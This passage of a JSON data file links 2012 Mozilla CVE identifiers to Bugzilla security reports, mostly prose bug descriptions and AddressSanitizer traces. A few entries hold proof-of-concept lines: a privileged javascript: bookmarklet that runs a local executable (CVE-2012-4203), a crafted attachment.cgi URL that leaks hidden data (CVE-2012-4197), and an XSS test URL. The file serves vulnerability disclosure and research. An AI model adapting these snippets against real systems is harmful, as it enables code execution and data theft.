        "description": "This is a regression from bug 754202. (fx16,17,18 are affected.) When a chrome code calls an untrusted function via CrossCompartmentWrapper/WaiveXrayWrapper, GetSubjectPrincipal returns a content principal, but GetPrincipalAndFrame returns the system principal. nsLocation::CheckURL gets an owner principal by calling GetCxSubjectPrincipalAndFrame, which calls GetPrincipalAndFrame. By using this bug, content can perform an XSS attack, and if there is an extension that exposes a chrome window to content, content can run arbitrary code with chrome privileges."
      }
    ],
    "CVE-2012-4197": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=802204",
        "title": "[SECURITY] Marking an attachment you cannot see as obsolete can disclose its description",
        "description": "If an attachment is in a bug you cannot see but for some reason you know its ID (e.g. because bugbot reports the attachment ID on IRC when someone requests/grants/denies review), it's trivial to get its description despite you cannot access the attachment nor the bug: Imagine you can access the public bug 3 and the attachment 1 [details] [diff] [review] is in the private bug 4. All you have to do is to type this URL in your web browser (with a valid token, but you can extract it from the HTML form): attachment.cgi?action=insert&bugid=3&obsolete=1&token=XXXXXXX Bugzilla will detect the mismatch and throws: \"Attachment 1 [details] [diff] (patch to fix the vulnerability in Foo.cpp when doing action X) is attached to bug 4, but you tried to flag it as obsolete while creating a new attachment to bug 3.\" The error message disclosed the description of the attachment, despite you cannot access it! This vulnerability exists since Bugzilla 2.16, see bug 98602!"
      }
    ],
    "CVE-2012-4198": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=781850",
        "title": "[SECURITY] Do not leak the existence of groups when using User.get()",
        "description": "I just realized that User.get becomes way too verbose in Bugzilla 4.4. With a powerless account, I can access personal information, some of which power users shouldn't have access to either (even with admin or editusers privs): - (confidential) groups a user belongs to, bug 548198 (Bugzilla 4.0!) - unshared saved searches, bug 697224 (Bugzilla 4.4) This is totally unacceptable and this information must only be disclosed if you are querying your own account, i.e. the user ID matches Bugzilla->user->id. I know I approved bug 697224, but I didn't realize that all users could have access to this information. I clearly withdraw my approval here. Said differently, saved searches should never be disclosed to anyone but you. From the UI, admins have no way to get this information, except by impersonating the user account, in which case the user is informed by email that someone is looking at his account. So there is no reason that someone can have access to this information using User.get, even for admins. About groups, User.get is disclosing if a group exists or not, defeating CVE-2011-2380, see bug 653477. Bugzilla::Group->check_no_disclose() must be used instead of Bugzilla::Group->check()."
      }
    ],
    "CVE-2012-4199": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=731178",
        "title": "[SECURITY] field-events.js.tmpl discloses product and component names that the user is not allowed to see",
        "description": "If a custom field visibility is controlled by a product or a component of a product you cannot see, their names are displayed in the JS code generated by field-events.js.tmpl: showFieldWhen('cf_audience', 'component', [ 'very_secret_component' ]); The UI itself has no reference to this component, but looking at the source code of the page discloses this information. I'm not sure since when this problem exists. This template exists since Bugzilla 3.4, see bug 308253, but maybe this problem has been introduced later. We would have to check. This bug will probably be fixed by bug 695514 for trunk (and 4.2, if there is a valuable perf win)."
      }
    ],
    "CVE-2012-4201": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=747607",
        "title": "Problem with evalInSandbox and location",
        "description": "This is related to bug 736537. If a code executed by evalInSandbox() sets location.href, nsLocation::CheckURL() gets the wrong subject principal since GetContextFromStack() ignores a sandbox's JS context and gets a JS context on which a chrome code that calls evalInSandbox() is running. Greasemonkey user scripts that access unsafeWindow could be affected. - An attacker can perform an XSS attack. - An attacker can steal a local file."
      }
    ],
    "CVE-2012-4202": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=758200",
        "title": "ASAN: Heap-buffer-overflow at image::RasterImage::DrawFrameTo",
        "description": "This bug seems to be some sort of race condition. The bug is fairly hard to reproduce, but I was able to reproduce it with the files in the attached zip and with the build from http://ftp.mozilla.org/pub/mozilla.org/firefox/try-builds/decoder@own-hero.net-9751d29c325 d/try-linux64-debug/firefox-15.0a1.en-US.linux-x86_64.tar.bz2 ASAN report: ( Using build from http://ftp.mozilla.org/pub/mozilla.org/firefox/try-builds/decoder@own-hero.net-9751d29c325 d/try-linux64-debug/firefox-15.0a1.en-US.linux-x86_64.tar.bz2 ) ==31319== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fd2b6d89e80 at pc 0x7fd305566383 bp 0x7fff393c7c10 sp 0x7fff393c7c08 READ of size 4 at 0x7fd2b6d89e80 thread T0 #0 0x7fd305566383 in mozilla::image::RasterImage::DrawFrameTo(imgFrame*, imgFrame*, nsIntRect&) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:2070 #1 0x7fd30555c2ec in mozilla::image::RasterImage::DoComposite(nsIntRect*, imgFrame*, imgFrame*, int) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:1885 #2 0x7fd30555af67 in mozilla::image::RasterImage::AdvanceFrame(mozilla::TimeStamp, nsIntRect*) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:369 #3 0x7fd30555c96b in mozilla::image::RasterImage::RequestRefresh(mozilla::TimeStamp const&) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:412 #4 0x7fd30575563d in nsRefreshDriver::ImageRequestEnumerator(nsISupportsHashKey*, void*) /builds/slave/try-lnx64-dbg/build/layout/base/nsRefreshDriver.cpp:454 #5 0x7fd3075e906b in PL_DHashTableEnumerate /builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/pldhash.cpp:715 #6 0x7fd30575545a in nsTHashtable<nsISupportsHashKey>::EnumerateEntries(PLDHashOperator (*)(nsISupportsHashKey*, void*), void*) /builds/slave/try-lnx64-dbg/build/../../dist/include/nsTHashtable.h:237 #7 0x7fd305754dda in nsRefreshDriver::Notify(nsITimer*) /builds/slave/try-lnx64-dbg/build/layout/base/nsRefreshDriver.cpp:410 #8 0x7fd30769fdff in nsTimerImpl::Fire() /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsTimerImpl.cpp:476 #9 0x7fd3076a07fd in nsTimerEvent::Run() /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsTimerImpl.cpp:559 #10 0x7fd30769332d in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsThread.cpp:624 #11 0x7fd3075e49e3 in NS_ProcessNextEvent_P(nsIThread*, bool) /builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:213 #12 0x7fd3073f3cae in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/try-lnx64-dbg/build/ipc/glue/MessagePump.cpp:113 #13 0x7fd307718442 in MessageLoop::RunInternal() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:209 #14 0x7fd30771832f in MessageLoop::Run() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:176 #15 0x7fd3071b8c52 in nsBaseAppShell::Run() /builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsBaseAppShell.cpp:165 #16 0x7fd306d77b41 in nsAppStartup::Run() /builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsAppStartup.cpp:256 #17 0x7fd305187d43 in XREMain::XRE_mainRun() /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3765 #18 0x7fd3051890e8 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3842 #19 0x7fd305189b62 in XRE_main /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3918 #20 0x4079c2 in do_main(int, char**) /builds/slave/try-lnx64-dbg/build/browser/app/nsBrowserApp.cpp:157 #21 0x4071ba in main /builds/slave/try-lnx64-dbg/build/browser/app/nsBrowserApp.cpp:244 #22 0x7fd30eaf5eff in __libc_start_main /build/buildd/eglibc-2.13/csu/libc-start.c:258 0x7fd2b6d89e80 is located 0 bytes to the right of 513-byte region [0x7fd2b6d89c80,0x7fd2b6d89e81) allocated by thread T0 here: #0 0x4276a2 in malloc ??:0 #1 0x7fd305579808 in imgFrame::Init(int, int, int, int, gfxASurface::gfxImageFormat, unsigned char) /builds/slave/try-lnx64-dbg/build/image/src/imgFrame.cpp:169 #2 0x7fd305561b6e in mozilla::image::RasterImage::InternalAddFrame(unsigned int, int, int, int, int, gfxASurface::gfxImageFormat, unsigned char, unsigned char**, unsigned int*, unsigned int**, unsigned int*) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:1044 #3 0x7fd3055623be in mozilla::image::RasterImage::EnsureFrame(unsigned int, int, int, int, int, gfxASurface::gfxImageFormat, unsigned char, unsigned char**, unsigned int*, unsigned int**, unsigned int*) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:1145 #4 0x7fd3055b4e96 in mozilla::image::nsGIFDecoder2::BeginImageFrame(unsigned short) /builds/slave/try-lnx64-dbg/build/image/decoders/nsGIFDecoder2.cpp:185 #5 0x7fd3055b8ecd in mozilla::image::nsGIFDecoder2::WriteInternal(char const*, unsigned int) /builds/slave/try-lnx64-dbg/build/image/decoders/nsGIFDecoder2.cpp:922 #6 0x7fd305563fde in mozilla::image::RasterImage::WriteToDecoder(char const*, unsigned int) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:2378 #7 0x7fd305568374 in mozilla::image::RasterImage::DecodeSomeData(unsigned int) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:2731 #8 0x7fd305569105 in mozilla::image::RasterImage::DecodeWorker::DecodeSomeOfImage(mozilla::image::RasterImage*, mozilla::image::RasterImage::DecodeWorker::DecodeType) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:3028 #9 0x7fd305568a7d in mozilla::image::RasterImage::DecodeWorker::Run() /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:2957 #10 0x7fd30769332d in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsThread.cpp:624 #11 0x7fd3075e49e3 in NS_ProcessNextEvent_P(nsIThread*, bool) /builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:213 #12 0x7fd3073f3cc9 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/try-lnx64-dbg/build/ipc/glue/MessagePump.cpp:82 #13 0x7fd307718442 in MessageLoop::RunInternal() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:209 #14 0x7fd30771832f in MessageLoop::Run() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:176 #15 0x7fd3071b8c52 in nsBaseAppShell::Run() /builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsBaseAppShell.cpp:165 #16 0x7fd306d77b41 in nsAppStartup::Run() /builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsAppStartup.cpp:256 #17 0x7fd305187d43 in XREMain::XRE_mainRun() /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3765 #18 0x7fd3051890e8 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3842 #19 0x7fd305189b62 in XRE_main /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3918 #20 0x4079c2 in do_main(int, char**) /builds/slave/try-lnx64-dbg/build/browser/app/nsBrowserApp.cpp:157 #21 0x4071ba in main /builds/slave/try-lnx64-dbg/build/browser/app/nsBrowserApp.cpp:244 ==31319== ABORTING Stats: 1296M malloced (1238M for red zones) by 2598427 calls Stats: 340M realloced by 249611 calls Stats: 1243M freed by 2350356 calls Stats: 1114M really freed by 2040296 calls Stats: 812M (208022 full pages) mmaped in 203 calls mmaps by size class: 8:442341; 9:90101; 10:28665; 11:16376; 12:5120; 13:5120; 14:2048; 15:1024; 16:1088; 17:160; 18:208; 19:72; 20:140; 21:78; 22:1; mallocs by size class: 8:1938088; 9:399426; 10:123808; 11:66502; 12:21500; 13:26796; 14:10485; 15:6225; 16:4102; 17:434; 18:590; 19:92; 20:300; 21:78; 22:1; frees by size class: 8:1733745; 9:371387; 10:116404; 11:61308; 12:20229; 13:25807; 14:9918; 15:6176; 16:3939; 17:423; 18:552; 19:91; 20:299; 21:77; 22:1; rfrees by size class: 8:1508469; 9:319321; 10:101173; 11:53186; 12:17227; 13:22292; 14:8562; 15:5231; 16:3485; 17:382; 18:522; 19:89; 20:279; 21:77; 22:1; Stats: malloc large: 1495 small slow: 14726 Shadow byte and word: 0x1ffa56db13d0: 1 0x1ffa56db13d0: 01 fb fb fb fb fb fb fb More shadow bytes: 0x1ffa56db13b0: 00 00 00 00 00 00 00 00 0x1ffa56db13b8: 00 00 00 00 00 00 00 00 0x1ffa56db13c0: 00 00 00 00 00 00 00 00 0x1ffa56db13c8: 00 00 00 00 00 00 00 00 =>0x1ffa56db13d0: 01 fb fb fb fb fb fb fb 0x1ffa56db13d8: fb fb fb fb fb fb fb fb 0x1ffa56db13e0: fa fa fa fa fa fa fa fa 0x1ffa56db13e8: fa fa fa fa fa fa fa fa 0x1ffa56db13f0: fa fa fa fa fa fa fa fa"
      }
    ],
    "CVE-2012-4203": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=765628",
        "title": "Bookmarklets on the new tab page are able to run privileged javascript",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0 Build ID: 20120601173958 Steps to reproduce: Clicking a javascript: url from the new tab page will run the script with full privileges. These javascript: urls are frequently used as 'bookmarklets' to run small javascript snippets. Were a malicious party able to socially engineer a user to bookmark a javscript bookmarklet and add it to the new FF13 \"new tab page\", when the user clicked the link from the new tab page privileged javascript would run. The following is an example of privileged javascript which runs gcalctool on ubuntu: 'javascript:var file = Components.classes[\"@mozilla.org/file/local;1\"].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\"/usr/bin/gcalctool\");var process = Components.classes[\"@mozilla.org/process/util;1\"].createInstance(Components.interfaces.nsIProcess);process.init(file);var args = [];process.run(false, args, args.length);' adding that url as a bookmark and launching it from the new tab page will run the native gcalctool executable. (For windows, change the path to a windows executable.) I've attached a html page which demonstrates the steps a user would have to take. I've marked the bug as security sensitive as bookmarklets are widely used. Only tested on 32-bit firefox 13 running on ubuntu."
      }
    ],
    "CVE-2012-4204": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=778603",
        "title": "Out of bounds read in str_unescape",
        "description": "I ran into this issue while fuzzing. ASAN reports this as a heap overflow. I wasn't able to symbolize the ASAN output for some unknown reason. However, I see it crashing at strange locations on different runs on optimized builds. In debug builds, it hits this assertion and crashes @ NULL: Assertion failure: mLength + 1 <= mReserved, at ./../../dist/include/js/Vector.h:788 Windbg references this code: mozjs!str_unescape+0x23e [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\js\\src\\jsstr.cpp @ 352] I have attached some logs from both debug and optimized builds."
      }
    ],
    "CVE-2012-4205": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=779821",
        "title": "XHR created from sandboxes end up having system principal instead of principal of the sandbox",
        "description": "I have not yet tested this just noticed the change in nsXHR init method. It is now using system principal, while previously it was using the current principal (fetched from the context stack if I'm not mistaken that has been removed...). CreateXMLHttpRequest method in XPCComponents.cpp should create an XHR object with the principal of the sandbox."
      }
    ],
    "CVE-2012-4207": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=801681",
        "title": "\"~\" eats a char near chunk delimiter in HZ-GB-2312 encoding",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20100101 Firefox/16.0 Build ID: 20121010144125 Steps to reproduce: In HZ-GB-2312 encoding, \"~\" eats a char near chunk delimiter. This behavior is Firefox only. This leads to XSS attack: http://vulnerabledoma.in/fx_hz?q=~%20123 Also, this has potential risk of Bug 690225. Expected results: \"~\" should not eat character."
      }
    ],
    "CVE-2012-4208": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=798264",
        "title": "Xrays for new DOM bindings need to filter properties based on their compartment",
        "description": "Right now we always expose ChromeOnly properties on Xrays, but we should only do that if the Xray is in a chrome compartment. We should probably do away with the dual property tables and have an additional flag in the table for chrome-only properties. The prototype setup can decide based on the compartment whether to add those or not, and the Xray code can pass in the flag's required value based on the Xray's compartment."
      }
    ],
    "CVE-2012-4209": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=792405",
        "title": "Frames can shadow |top|",
        "description": "It is possible to shadow |top| with a frame whose name attribute's value is set to \"top\". As a result, plugins accessing top.location, such as Adobe Flash Player, may read an arbitrary URL. The fix to bug 765527 doesn't seem to cover this case."
      }
    ],
    "CVE-2012-4210": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=796866",
        "title": "Arbitrary code execution from Style Inspector",
        "description": "It is possible to execute arbitrary code when a user inspects computed styles on a malicious website containing a specially crafted style sheet. The problem lies in the function PropertyView_refresh in CssHtmlTree.jsm, which writes user-controlled CSS values to innerHTML without sanitizing the input. This paves the way for an HTML markup injection in the privileged context of chrome://browser/content/devtools/csshtmltree.xul"
      }
    ],
    "CVE-2012-4212": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=786142",
        "title": "Heap-use-after-free in XPCWrappedNative::Mark",
        "description": "This reproduces on trunk and hitting quite frequently with flaky test. I am trying to get a reliable testcase. ================================================================= ==24146== ERROR: AddressSanitizer heap-use-after-free on address 0x7f25472e02a0 at pc 0x7f2584cab0a4 bp 0x7fff7adad6b0 sp 0x7fff7adad6a8 READ of size 8 at 0x7f25472e02a0 thread T0 #0 0x7f2584cab0a3 in XPCWrappedNative::Mark() const src/js/xpconnect/src/xpcprivate.h:2836 #1 0x7f2584d22e14 in WrappedNativeMarker(JSDHashTable*, JSDHashEntryHdr*, unsigned int, void*) src/js/xpconnect/src/XPCWrappedNativeScope.cpp:433 #2 0x7f258ff599d3 in JS_DHashTableEnumerate src/js/src/jsdhash.cpp:710 #3 0x7f25848fd8ea in Native2WrappedNativeMap::Enumerate(JSDHashOperator (*)(JSDHashTable*, JSDHashEntryHdr*, unsigned int, void*), void*) src/js/xpconnect/src/XPCMaps.h:137 #4 0x7f2584d22a14 in XPCWrappedNativeScope::MarkAllWrappedNativesAndProtos() src/js/xpconnect/src/XPCWrappedNativeScope.cpp:452 #5 0x7f2584b4dd17 in XPCJSRuntime::FinalizeCallback(JSFreeOp*, JSFinalizeStatus, int) src/js/xpconnect/src/XPCJSRuntime.cpp:792 #6 0x7f25900e6421 in BeginSweepPhase(JSRuntime*) src/js/src/jsgc.cpp:3779 #7 0x7f25900e0cd0 in IncrementalCollectSlice(JSRuntime*, long, js::gcreason::Reason, js::JSGCInvocationKind) src/js/src/jsgc.cpp:4214 #8 0x7f25900de5a2 in GCCycle(JSRuntime*, bool, long, js::JSGCInvocationKind, js::gcreason::Reason) src/js/src/jsgc.cpp:4392 #9 0x7f2590093509 in Collect(JSRuntime*, bool, long, js::JSGCInvocationKind, js::gcreason::Reason) src/js/src/jsgc.cpp:4500 #10 0x7f2590083101 in js::GCSlice(JSRuntime*, js::JSGCInvocationKind, js::gcreason::Reason, long) src/js/src/jsgc.cpp:4538 #11 0x7f258ffe027f in js::IncrementalGC(JSRuntime*, js::gcreason::Reason, long) src/js/src/jsfriendapi.cpp:171 #12 0x7f2581df8e5e in nsJSContext::GarbageCollectNow(js::gcreason::Reason, nsJSContext::IsIncremental, nsJSContext::IsCompartment, nsJSContext::IsShrinking, long) src/dom/base/nsJSEnvironment.cpp:2922 #13 0x7f2581e407fe in InterSliceGCTimerFired(nsITimer*, void*) src/dom/base/nsJSEnvironment.cpp:3204 #14 0x7f2589762d22 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #15 0x7f25897645d8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #16 0x7f25897279ce in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #17 0x7f25893c8e27 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #18 0x7f25881a5b2b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:117 #19 0x7f25899d4bd9 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #20 0x7f25899d4a22 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #21 0x7f25899d4907 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #22 0x7f258766f7ae in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #23 0x7f25862e0448 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #24 0x7f257cae79b0 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3800 #25 0x7f257caedc24 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3877 #26 0x7f257caf0cee in XRE_main src/toolkit/xre/nsAppRunner.cpp:3953 #27 0x40c5bb in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #28 0x409e1f in main src/browser/app/nsBrowserApp.cpp:279 #29 0x7f2599ba8c4d in ?? ??:0 0x7f25472e02a0 is located 32 bytes inside of 96-byte region [0x7f25472e0280,0x7f25472e02e0) freed by thread T0 here: #0 0x4c3e30 in free ??:0 #1 0x7f2596a46572 in moz_free src/memory/mozalloc/mozalloc.cpp:51 #2 0x7f2584c6d245 in operator delete(void*) src/../../../dist/include/mozilla/mozalloc.h:224 #3 0x7f2584c72fc0 in XPCWrappedNative::Release() src/js/xpconnect/src/XPCWrappedNative.cpp:1214 #4 0x7f2584c73bfe in XPCWrappedNative::FlatJSObjectFinalized() src/js/xpconnect/src/XPCWrappedNative.cpp:1338 #5 0x7f2584d143c2 in WrappedNativeFinalize(js::FreeOp*, JSObject*, WNHelperType) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:617 #6 0x7f2584cdd10c in XPC_WN_NoHelper_Finalize(js::FreeOp*, JSObject*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:623 #7 0x7f2590118cd8 in JSObject::finalize(js::FreeOp*) src/js/src/jsobjinlines.h:235 #8 0x7f25900feb6a in bool js::gc::FinalizeTypedArenas<JSObject>(js::FreeOp*, js::gc::ArenaHeader**, js::gc::ArenaList&, js::gc::AllocKind, js::SliceBudget&) src/js/src/jsgc.cpp:412 #9 0x7f259006a0b9 in js::gc::FinalizeArenas(js::FreeOp*, js::gc::ArenaHeader**, js::gc::ArenaList&, js::gc::AllocKind, js::SliceBudget&) src/js/src/jsgc.cpp:449 #10 0x7f259006bb91 in js::gc::ArenaLists::finalizeNow(js::FreeOp*, js::gc::AllocKind) src/js/src/jsgc.cpp:1626 #11 0x7f259006b4d3 in js::gc::ArenaLists::queueObjectsForSweep(js::FreeOp*) src/js/src/jsgc.cpp:1722 #12 0x7f25900e5db9 in BeginSweepPhase(JSRuntime*) src/js/src/jsgc.cpp:3750 #13 0x7f25900e0cd0 in IncrementalCollectSlice(JSRuntime*, long, js::gcreason::Reason, js::JSGCInvocationKind) src/js/src/jsgc.cpp:4214 #14 0x7f25900de5a2 in GCCycle(JSRuntime*, bool, long, js::JSGCInvocationKind, js::gcreason::Reason) src/js/src/jsgc.cpp:4392 #15 0x7f2590093509 in Collect(JSRuntime*, bool, long, js::JSGCInvocationKind, js::gcreason::Reason) src/js/src/jsgc.cpp:4500 #16 0x7f2590083101 in js::GCSlice(JSRuntime*, js::JSGCInvocationKind, js::gcreason::Reason, long) src/js/src/jsgc.cpp:4538 #17 0x7f258ffe027f in js::IncrementalGC(JSRuntime*, js::gcreason::Reason, long) src/js/src/jsfriendapi.cpp:171 #18 0x7f2581df8e5e in nsJSContext::GarbageCollectNow(js::gcreason::Reason, nsJSContext::IsIncremental, nsJSContext::IsCompartment, nsJSContext::IsShrinking, long) src/dom/base/nsJSEnvironment.cpp:2922 #19 0x7f2581e407fe in InterSliceGCTimerFired(nsITimer*, void*) src/dom/base/nsJSEnvironment.cpp:3204 #20 0x7f2589762d22 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #21 0x7f25897645d8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #22 0x7f25897279ce in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #23 0x7f25893c8e27 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #24 0x7f25881a5b2b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:117 #25 0x7f25899d4bd9 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #26 0x7f25899d4a22 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #27 0x7f25899d4907 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #28 0x7f258766f7ae in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #29 0x7f25862e0449 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 previously allocated by thread T0 here: #0 0x4c3ef0 in __interceptor_malloc ??:0 #1 0x7f2596a466c6 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 #2 0x7f2584c6555b in operator new(unsigned long) src/../../../dist/include/mozilla/mozalloc.h:200 #3 0x7f2584a98040 in XPCConvert::NativeInterface2JSObject(XPCLazyCallContext&, JS::Value*, nsIXPConnectJSObjectHolder**, xpcObjectHelper&, nsID const*, XPCNativeInterface**, bool, unsigned int*) src/js/xpconnect/src/XPCConvert.cpp:920 #4 0x7f2584a919be in XPCConvert::NativeData2JS(XPCLazyCallContext&, JS::Value*, void const*, nsXPTType const&, nsID const*, unsigned int*) src/js/xpconnect/src/XPCConvert.cpp:319 #5 0x7f2584ad147b in XPCConvert::NativeData2JS(XPCCallContext&, JS::Value*, void const*, nsXPTType const&, nsID const*, unsigned int*) src/js/xpconnect/src/xpcprivate.h:3310 #6 0x7f2584c97453 in CallMethodHelper::GatherAndConvertResults() src/js/xpconnect/src/XPCWrappedNative.cpp:2642 #7 0x7f2584cf70c5 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1478 #8 0x7f2590381951 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:372 #9 0x7f259030ea41 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2413 #10 0x7f2590275a35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:309 #11 0x7f259038ec66 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:494 #12 0x7f2590390c1e in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:531 #13 0x7f258fae8334 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5665 #14 0x7f258faed2d1 in JS_EvaluateUCScriptForPrincipalsVersionOrigin src/js/src/jsapi.cpp:5746 #15 0x7f2581e1162f in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1497 #16 0x7f2581fc11bf in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9590 #17 0x7f2581f78b39 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9851 #18 0x7f2581fbf21a in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10118 #19 0x7f2589762d22 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #20 0x7f25897645d8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #21 0x7f25897279ce in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #22 0x7f25893c8e27 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #23 0x7f25881a5595 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #24 0x7f25899d4bda in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:209 Shadow byte and word: 0x1fe4a8e5c054: fd 0x1fe4a8e5c050: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe4a8e5c030: 00 00 00 00 00 00 00 00 0x1fe4a8e5c038: fb fb fb fb fb fb fb fb 0x1fe4a8e5c040: fa fa fa fa fa fa fa fa 0x1fe4a8e5c048: fa fa fa fa fa fa fa fa =>0x1fe4a8e5c050: fd fd fd fd fd fd fd fd 0x1fe4a8e5c058: fd fd fd fd fd fd fd fd 0x1fe4a8e5c060: fa fa fa fa fa fa fa fa 0x1fe4a8e5c068: fa fa fa fa fa fa fa fa 0x1fe4a8e5c070: fd fd fd fd fd fd fd fd Stats: 287M malloced (327M for red zones) by 649602 calls Stats: 79M realloced by 89263 calls Stats: 248M freed by 411873 calls Stats: 